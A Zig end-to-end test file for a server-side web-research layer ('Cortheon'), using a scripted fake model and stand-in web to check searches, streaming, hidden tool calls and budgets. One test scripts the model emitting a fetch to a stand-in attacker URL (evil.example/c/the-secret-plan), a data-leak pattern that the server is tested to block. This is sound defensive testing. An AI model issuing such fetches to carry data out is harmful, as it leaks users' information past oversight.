//! Cortheon end to end on a scripted engine and a stand-in web: rounds, research, streams, splices and checks.
const std = @import("std");
const api = @import("engine_api");
const json = @import("json");
const model_text = @import("../model_text.zig");
const openai = @import("../openai.zig");
const server_mod = @import("../server.zig");
const Conn = @import("../http_conn.zig").Conn;
const cortheon = @import("cortheon.zig");
const tools = @import("tools.zig");
const search = @import("search.zig");
const checks = @import("checks.zig");
const Value = json.Value;
const Allocator = std.mem.Allocator;

const gpa = std.testing.allocator;
const io = std.testing.io;

/// Bytes as tokens; renders roles, contents, calls and the offered tool names.
const Text = struct {
    fn text(t: *@This()) model_text.Text {
        return .{ .ctx = t, .vtable = &.{ .encode = encode, .decode = decode, .token_id = tokenId, .token_string = tokenString, .vocab_size = vocabSize, .eos_ids = eosIds, .render = render, .template_source = templateSource } };
    }
    fn encode(_: *anyopaque, a: Allocator, input: []const u8, _: bool) model_text.Error![]u32 {
        const ids = try a.alloc(u32, input.len);
        for (input, ids) |byte, *id| id.* = byte;
        return ids;
    }
    fn decode(_: *anyopaque, a: Allocator, ids: []const u32) Allocator.Error![]u8 {
        const out = try a.alloc(u8, ids.len);
        for (ids, out) |id, *byte| byte.* = @intCast(id);
        return out;
    }
    fn tokenId(_: *anyopaque, _: []const u8) ?u32 {
        return null;
    }
    fn tokenString(_: *anyopaque, a: Allocator, id: u32) Allocator.Error![]u8 {
        return std.fmt.allocPrint(a, "{d}", .{id});
    }
    fn vocabSize(_: *anyopaque) u32 {
        return 256;
    }
    fn eosIds(_: *anyopaque) []const u32 {
        return &.{};
    }
    fn render(_: *anyopaque, a: Allocator, messages: Value, options: model_text.RenderOptions, _: *[]const u8) model_text.Error![]u8 {
        var buf: std.ArrayList(u8) = .empty;
        if (options.tools) |t| for (t.array) |spec| try buf.print(a, "tool:{s}\n", .{tools.callName(spec)});
        if (messages == .array) for (messages.array) |m| {
            try buf.print(a, "{s}:{s}", .{ m.strField("role") orelse "", m.strField("content") orelse "" });
            if (m.get("tool_calls")) |calls| if (calls == .array) for (calls.array) |c| try buf.print(a, " [call {s}]", .{tools.callName(c)});
            try buf.append(a, '\n');
        };
        if (options.add_generation_prompt) try buf.append(a, '>');
        return buf.items;
    }
    fn templateSource(_: *anyopaque) []const u8 {
        return "";
    }
};

/// Answers each request with the next scripted reply ("OK" past the end), keeping every prompt.
const Eng = struct {
    script: []const []const u8 = &.{},
    next: usize = 0,
    refuse_at: ?usize = null,
    refusal: api.SubmitError = error.Closed,
    prompts: std.ArrayList([]u8) = .empty,

    fn engine(e: *Eng) api.Engine {
        return .{ .ctx = e, .vtable = &.{ .info = info, .submit = submit, .cancel = cancel, .status = status, .memory = memory } };
    }
    fn info(_: *anyopaque) api.Info {
        return .{ .context_window = 0, .name = "fake" };
    }
    fn submit(ctx: *anyopaque, id: api.Id, request: *const api.Request, sink: api.Sink) api.SubmitError!void {
        const e: *Eng = @ptrCast(@alignCast(ctx));
        if (e.refuse_at == e.next) return e.refusal;
        const buf = gpa.alloc(u8, request.prompt.len) catch return error.Busy;
        for (request.prompt, buf) |tok, *byte| byte.* = @intCast(tok);
        e.prompts.append(gpa, buf) catch {};
        const reply = if (e.next < e.script.len) e.script[e.next] else "OK";
        e.next += 1;
        const toks = gpa.alloc(u32, reply.len) catch return error.Busy;
        defer gpa.free(toks);
        for (reply, toks) |byte, *t| t.* = byte;
        sink.event(sink.ctx, id, &.{ .prefilled = 0 });
        sink.event(sink.ctx, id, &.{ .tokens = toks });
        sink.event(sink.ctx, id, &.{ .finished = .{ .reason = .stop } });
    }
    fn cancel(_: *anyopaque, _: api.Id) void {}
    fn status(_: *anyopaque, out: *api.Status, _: []u32) void {
        out.* = .{};
    }
    fn memory(_: *anyopaque, _: bool) ?api.Memory {
        return null;
    }
    fn deinit(e: *Eng) void {
        for (e.prompts.items) |p| gpa.free(p);
        e.prompts.deinit(gpa);
    }
    fn saw(e: *const Eng, i: usize, needle: []const u8) bool {
        return i < e.prompts.items.len and std.mem.indexOf(u8, e.prompts.items[i], needle) != null;
    }
};

const Web = struct {
    searches: usize = 0,
    fn web(w: *Web) tools.Web {
        return .{ .ctx = w, .search = searchFn, .fetch = fetchFn };
    }
    fn searchFn(ctx: *anyopaque, a: Allocator, query: []const u8, _: usize) anyerror!tools.Found {
        const w: *Web = @ptrCast(@alignCast(ctx));
        w.searches += 1;
        const rs = try a.alloc(search.Result, 1);
        rs[0] = .{ .title = try std.fmt.allocPrint(a, "Docs for {s}", .{query}), .url = "https://docs.example/x", .snippet = "about x" };
        return .{ .engine = "Stand-in", .results = rs };
    }
    fn fetchFn(_: *anyopaque, _: Allocator, url: []const u8, _: usize, _: []const u8) anyerror!tools.Page {
        return .{ .url = url, .status = 200, .kind = "text/html", .title = "X docs", .text = "Zig 0.17 adds std.Io." };
    }
};

const Got = struct {
    events: std.ArrayList(Value) = .empty,
    body: ?Value = null,
    opened: bool = false,
    status: ?u16 = null,
    a: Allocator,
    fn out(g: *Got) openai.Out {
        return .{ .ctx = g, .vt = &.{ .open = open, .event = event, .reply = reply } };
    }
    fn open(ctx: *anyopaque, _: usize) error{Closed}!void {
        @as(*Got, @ptrCast(@alignCast(ctx))).opened = true;
    }
    fn event(ctx: *anyopaque, payload: ?Value) error{Closed}!void {
        const g: *Got = @ptrCast(@alignCast(ctx));
        if (payload) |p| g.events.append(g.a, json.deepCopy(g.a, p) catch return error.Closed) catch return error.Closed;
    }
    fn reply(ctx: *anyopaque, status: u16, payload: Value) void {
        const g: *Got = @ptrCast(@alignCast(ctx));
        g.status = status;
        g.body = json.deepCopy(g.a, payload) catch null;
    }
    /// Every streamed delta's text under `key`, joined.
    fn streamed(g: *const Got, key: []const u8) ![]const u8 {
        var text: std.ArrayList(u8) = .empty;
        for (g.events.items) |e| {
            const choices = (e.get("choices") orelse continue).items() orelse continue;
            if (choices.len == 0) continue;
            const d = choices[0].get("delta") orelse continue;
            try text.appendSlice(g.a, d.strField(key) orelse "");
        }
        return text.items;
    }
    fn streamedCalls(g: *const Got) ![]const u8 {
        var text: std.ArrayList(u8) = .empty;
        for (g.events.items) |e| {
            const choices = (e.get("choices") orelse continue).items() orelse continue;
            if (choices.len == 0) continue;
            const calls = (choices[0].get("delta") orelse continue).get("tool_calls") orelse continue;
            try text.appendSlice(g.a, try json.stringify(g.a, calls, .{}));
        }
        return text.items;
    }
};

const Rig = struct {
    eng: Eng = .{},
    text: Text = .{},
    web: Web = .{},
    srv: *server_mod.Server = undefined,

    fn start(r: *Rig, on: bool) !void {
        r.srv = try server_mod.Server.init(gpa, io, r.eng.engine(), r.text.text(), .{ .served_name = "m", .model_ids = &.{"m"}, .enable_thinking = false, .default_max_tokens = 2048 }, null);
        if (on) r.srv.cortheon = try cortheon.State.initWith(gpa, io, r.web.web());
    }

    fn stop(r: *Rig) void {
        r.srv.deinit();
        r.eng.deinit();
    }

    fn ask(r: *Rig, a: Allocator, body: []const u8) !Got {
        var got: Got = .{ .a = a };
        var conn: Conn = .{ .fd = -1, .peer = "", .buf = &.{}, .gpa = a };
        openai.run(r.srv, a, got.out(), .{ .conn = &conn }, true, (try json.parse(a, body)).ok);
        return got;
    }
};

fn message(body: Value) Value {
    return body.get("choices").?.array[0].get("message").?;
}

test "off: the request reaches the model untouched" {
    var rig: Rig = .{};
    try rig.start(false);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const got = try rig.ask(arena.allocator(), "{\"messages\": [{\"role\": \"user\", \"content\": \"What is the latest Zig?\"}]}");
    try std.testing.expectEqualStrings("user:What is the latest Zig?\n>", rig.eng.prompts.items[0]);
    try std.testing.expect(got.body.?.get("cortheon") == null);
}

test "the model's own search runs on the server and only the answer reaches the client" {
    var rig: Rig = .{ .eng = .{ .script = &.{ "Let me look that up.<tool_call>{\"name\": \"cortheon_search\", \"arguments\": {\"query\": \"zig 0.17 std.Io\"}}</tool_call>", "It adds std.Io (https://docs.example/x)." } } };
    try rig.start(true);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const a = arena.allocator();
    const got = try rig.ask(a, "{\"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser\"}]}");
    try std.testing.expect(rig.eng.saw(0, "Cortheon reasoning is on") and rig.eng.saw(0, "tool:cortheon_search") and rig.eng.saw(0, "tool:cortheon_fetch"));
    try std.testing.expect(rig.eng.saw(1, "Web results for \"zig 0.17 std.Io\" (Stand-in"));
    try std.testing.expect(rig.eng.saw(1, "[call cortheon_search]"));
    const m = message(got.body.?);
    try std.testing.expectEqualStrings("It adds std.Io (https://docs.example/x).", m.strField("content").?);
    try std.testing.expect(m.get("tool_calls") == null);
    try std.testing.expectEqualStrings("stop", got.body.?.get("choices").?.array[0].strField("finish_reason").?);
    const s = got.body.?.get("cortheon").?;
    try std.testing.expectEqual(@as(?i64, 1), s.get("searches").?.int64());
    try std.testing.expectEqual(@as(?i64, 2), s.get("rounds").?.int64());
    try std.testing.expectEqual(@as(usize, 1), rig.web.searches);
    // the next turn: the hidden search goes back in front of the reply it informed
    const before = rig.eng.prompts.items.len;
    _ = try rig.ask(a, "{\"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser\"}, {\"role\": \"assistant\", \"content\": \"It adds std.Io (https://docs.example/x).\"}, {\"role\": \"user\", \"content\": \"And then?\"}]}");
    const next = rig.eng.prompts.items[before];
    const results_at = std.mem.indexOf(u8, next, "Web results for").?;
    const reply_at = std.mem.indexOf(u8, next, "assistant:It adds std.Io").?;
    try std.testing.expect(results_at < reply_at);
}

test "a fresh question on current facts is researched before the model starts" {
    var rig: Rig = .{ .eng = .{ .script = &.{ "1. Zig latest release notes\n2. Zig 0.17 changelog\n", "The latest is 0.17." } } };
    try rig.start(true);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const got = try rig.ask(arena.allocator(), "{\"messages\": [{\"role\": \"user\", \"content\": \"What is the latest release of Zig?\"}]}");
    try std.testing.expect(rig.eng.saw(0, "You write web search queries"));
    try std.testing.expectEqual(@as(usize, 2), rig.web.searches);
    try std.testing.expect(rig.eng.saw(1, "Web results for \"Zig latest release notes\""));
    try std.testing.expect(rig.eng.saw(1, "Web results for \"Zig 0.17 changelog\""));
    try std.testing.expect(rig.eng.saw(1, "Page: https://docs.example/x (HTTP 200"));
    const s = got.body.?.get("cortheon").?;
    try std.testing.expect(s.get("research_first").?.bool);
    try std.testing.expectEqual(@as(?i64, 1), s.get("pages_read").?.int64());
    try std.testing.expectEqualStrings("https://docs.example/x", s.get("sources").?.array[0].string);
    // no URL in the answer: one more round for its sources, appended after it
    try std.testing.expect(rig.eng.saw(2, checks.sources_note));
    try std.testing.expectEqualStrings("The latest is 0.17.\n\nOK", message(got.body.?).strField("content").?);
}

test "research progress cannot open a stream before its final request is admitted" {
    for ([_]api.SubmitError{ error.Closed, error.Busy }) |reason| {
        var rig: Rig = .{ .eng = .{ .script = &.{"Zig latest release notes"}, .refuse_at = 1, .refusal = reason } };
        try rig.start(true);
        defer rig.stop();
        var arena: std.heap.ArenaAllocator = .init(gpa);
        defer arena.deinit();
        const got = try rig.ask(arena.allocator(), "{\"stream\":true,\"messages\":[{\"role\":\"user\",\"content\":\"What is the latest release of Zig?\"}]}");
        try std.testing.expect(rig.web.searches > 0);
        try std.testing.expectEqual(@as(?u16, 503), got.status);
        try std.testing.expect(!got.opened);
        try std.testing.expectEqual(@as(usize, 0), got.events.items.len);
        try std.testing.expectEqual(@as(i64, 0), rig.srv.preparing.load(.acquire));
    }
}

test "a stream hides Cortheon's calls, shows progress as reasoning, and passes the client's calls" {
    var rig: Rig = .{ .eng = .{ .script = &.{ "Let me check.<tool_call>{\"name\": \"cortheon_fetch\", \"arguments\": {\"url\": \"https://docs.example/x\"}}</tool_call>", "Listing files.<tool_call>{\"name\": \"bash\", \"arguments\": {\"command\": \"ls\"}}</tool_call>" } } };
    try rig.start(true);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const a = arena.allocator();
    const got = try rig.ask(a, "{\"stream\": true, \"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser, see https://docs.example/x\"}], \"tools\": [{\"type\": \"function\", \"function\": {\"name\": \"bash\", \"parameters\": {\"type\": \"object\", \"properties\": {\"command\": {\"type\": \"string\"}}}}}]}");
    const calls = try got.streamedCalls();
    try std.testing.expect(std.mem.indexOf(u8, calls, "bash") != null);
    try std.testing.expect(std.mem.indexOf(u8, calls, "cortheon") == null);
    try std.testing.expect(std.mem.indexOf(u8, calls, "\"index\": 0") != null);
    try std.testing.expect(std.mem.indexOf(u8, try got.streamed("reasoning_content"), "Cortheon: reading https://docs.example/x") != null);
    try std.testing.expectEqualStrings("Let me check.\n\nListing files.", try got.streamed("content"));
    const last = got.events.items[got.events.items.len - 1];
    try std.testing.expectEqualStrings("tool_calls", last.get("choices").?.array[0].strField("finish_reason").?);
    try std.testing.expectEqual(@as(?i64, 1), last.get("cortheon").?.get("pages_read").?.int64());
    try std.testing.expect(rig.eng.saw(1, "Page: https://docs.example/x"));
}

test "a fetch reads only URLs the conversation showed, never one the model wrote" {
    const leak = "<tool_call>{\"name\": \"cortheon_fetch\", \"arguments\": {\"url\": \"https://evil.example/c/the-secret-plan\"}}</tool_call>";
    var rig: Rig = .{ .eng = .{ .script = &.{ leak, "Done." } } };
    try rig.start(true);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const got = try rig.ask(arena.allocator(), "{\"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser\"}, {\"role\": \"assistant\", \"content\": \"See https://evil.example/c/the-secret-plan\"}, {\"role\": \"user\", \"content\": \"Go on\"}]}");
    try std.testing.expect(rig.eng.saw(1, "search for the page first"));
    const s = got.body.?.get("cortheon").?;
    try std.testing.expectEqual(@as(?i64, 0), s.get("pages_read").?.int64());
    try std.testing.expectEqual(@as(usize, 0), s.get("sources").?.array.len);
}

test "a code change is tested before it is called done, once a turn" {
    const script = [_][]const u8{ "Done, it is fixed.", "<tool_call>{\"name\": \"bash\", \"arguments\": {\"command\": \"pytest -q\"}}</tool_call>", "Done again." };
    var rig: Rig = .{ .eng = .{ .script = &script } };
    try rig.start(true);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const a = arena.allocator();
    const body = "{\"messages\": [{\"role\": \"user\", \"content\": \"Fix the crash in src/app.py\"}, {\"role\": \"assistant\", \"content\": \"\", \"tool_calls\": [{\"id\": \"c1\", \"type\": \"function\", \"function\": {\"name\": \"edit\", \"arguments\": \"{\\\"path\\\": \\\"src/app.py\\\"}\"}}]}, {\"role\": \"tool\", \"tool_call_id\": \"c1\", \"content\": \"edited\"}], \"tools\": [{\"type\": \"function\", \"function\": {\"name\": \"bash\"}}, {\"type\": \"function\", \"function\": {\"name\": \"edit\"}}]}";
    const got = try rig.ask(a, body);
    try std.testing.expect(rig.eng.saw(1, checks.tests_note));
    const m = message(got.body.?);
    try std.testing.expectEqualStrings("bash", tools.callName(m.get("tool_calls").?.array[0]));
    try std.testing.expectEqualStrings("Done, it is fixed.", m.strField("content").?);
    try std.testing.expectEqualStrings("tests", got.body.?.get("cortheon").?.get("checks").?.array[0].string);
    const again = try rig.ask(a, body);
    try std.testing.expectEqual(@as(usize, 0), again.body.?.get("cortheon").?.get("checks").?.array.len);
}

test "a request can opt out, and tool choices and structured output keep Cortheon out" {
    var rig: Rig = .{};
    try rig.start(true);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const a = arena.allocator();
    for ([_][]const u8{
        "{\"cortheon\": false, \"messages\": [{\"role\": \"user\", \"content\": \"What is the latest Zig?\"}]}",
        "{\"tool_choice\": \"none\", \"messages\": [{\"role\": \"user\", \"content\": \"What is the latest Zig?\"}], \"tools\": [{\"type\": \"function\", \"function\": {\"name\": \"bash\"}}]}",
    }) |body| {
        const before = rig.eng.prompts.items.len;
        const got = try rig.ask(a, body);
        try std.testing.expect(!rig.eng.saw(before, "Cortheon"));
        try std.testing.expect(got.body.?.get("cortheon") == null);
    }
}

test "the web budget ends the research and the reply still comes back without Cortheon calls" {
    const call = "<tool_call>{\"name\": \"cortheon_search\", \"arguments\": {\"query\": \"again\"}}</tool_call>";
    var rig: Rig = .{ .eng = .{ .script = &.{ call, call, call, call, call, call, call, "never" } } };
    try rig.start(true);
    defer rig.stop();
    var arena: std.heap.ArenaAllocator = .init(gpa);
    defer arena.deinit();
    const got = try rig.ask(arena.allocator(), "{\"messages\": [{\"role\": \"user\", \"content\": \"Explain my parser\"}]}");
    try std.testing.expectEqual(@as(usize, cortheon.calls_per_reply), rig.web.searches);
    try std.testing.expect(rig.eng.saw(cortheon.calls_per_reply, "web budget for this reply is spent"));
    const m = message(got.body.?);
    try std.testing.expect(m.get("tool_calls") == null);
    try std.testing.expect(std.mem.indexOf(u8, m.strField("content").?, "cortheon_search") == null);
}
